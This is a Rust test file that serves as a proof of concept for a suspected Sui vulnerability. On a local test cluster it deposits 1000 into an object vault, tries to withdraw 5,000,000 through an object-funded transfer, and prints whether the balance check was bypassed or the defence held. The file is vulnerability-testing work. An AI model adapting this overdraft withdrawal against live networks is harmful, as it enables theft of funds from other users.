// Copyright (c) Mysten Labs, Inc.
// SPDX-License-Identifier: Apache-2.0

//! PoC: Object Withdrawal Amount Bypass — FINAL v5 (WORKING)

use sui_test_transaction_builder::FundSource;
use sui_types::effects::TransactionEffectsAPI;
use test_cluster::addr_balance_test_env::TestEnvBuilder;

#[tokio::test]
async fn test_no_balance_check_on_object_withdrawal() {
    println!("\n");
    println!("========================================");
    println!("  PoC: Object Withdrawal Amount Bypass");
    println!("  Deposit: 1000  |  Withdraw: 5,000,000");
    println!("========================================\n");

    // [1] Setup — helper handles all version conflicts internally
    let mut env = TestEnvBuilder::new()
        .with_num_validators(1)
        .with_proto_override_cb(Box::new(|_, mut cfg| {
            cfg.set_enable_object_funds_withdraw_for_testing(true);
            cfg.enable_address_balance_gas_payments_for_testing();
            cfg
        }))
        .build()
        .await;

    println!("[+] Test cluster started\n");

    let sender = env.get_sender(0);

    // [2] Setup: publish + create vault + deposit 1000 (helper handles versions)
    println!("[1] Setup: Publishing, creating vault, depositing 1000...");
    let (package_id, vault_id) = env.setup_funded_object_balance_vault(1000).await;
    println!("    Package: {}", package_id);
    println!("    Vault: {}", vault_id);
    println!("    Deposited 1000 ✓\n");

    // [3] ATTACK: Get FRESH refs AFTER setup transactions complete
    let attack_amount = 5_000_000u64;

    // Get FRESH vault ref (version changed after deposit)
    let vault_ref = env.cluster.get_latest_object_ref(&vault_id).await;
    // Get FRESH gas (auto-refreshed after setup)
    let gas_attack = env.gas_objects[&sender][0];

    println!("[2] ATTACK: Withdrawing {} from vault (balance: 1000)...", attack_amount);
    println!("    Vault: {} (version: {:?})", vault_ref.0, vault_ref.1);

    let tx = env
        .tx_builder_with_gas(sender, gas_attack)
        .transfer_sui_to_address_balance(
            FundSource::object_fund_owned(package_id, vault_ref),
            vec![(attack_amount, sender)],
        )
        .build();

    let result = env.exec_tx_directly(tx).await;

    // [4] Analyze
    println!("\n========================================");
    println!("  RESULT");
    println!("========================================\n");

    match result {
        Ok((digest, effects)) => {
            println!("    TX Digest: {}", digest);
            println!("    TX Status: {:?}\n", effects.status());

            if effects.status().is_ok() {
                println!("╔══════════════════════════════════════════════════════════════════╗");
                println!("║  🔴 CRITICAL: VULNERABILITY CONFIRMED!                          ║");
                println!("╚══════════════════════════════════════════════════════════════════╝");
                println!();
                println!("    withdraw_funds_from_object() SUCCEEDED");
                println!("    with amount 5000x the actual balance!");
                println!();
                println!("    Balance:    1,000");
                println!("    Requested:  5,000,000");
                println!("    Ratio:      5000x overdraft");
                println!();

                if !effects.accumulator_events().is_empty() {
                    println!("    [+] Split event found in effects!");
                }
                panic!("[CRITICAL] Balance check bypassed!");

            } else {
                let status_str = format!("{:?}", effects.status());
                println!("    ✓ Transaction FAILED\n");
                println!("    Status: {}\n", status_str);

                if status_str.contains("InsufficientFunds")
                    || status_str.contains("ENotEnough")
                {
                    println!("╔══════════════════════════════════════════════════════════════════╗");
                    println!("║  🟢 DEFENSE DETECTED — VULNERABILITY LIKELY FIXED               ║");
                    println!("╚══════════════════════════════════════════════════════════════════╝");
                } else {
                    println!("[?] Unexpected error");
                }
            }
        }
        Err(e) => {
            println!("    ✗ Execution error: {:?}", e);
            println!("\n    [?] Test setup issue");
        }
    }
}
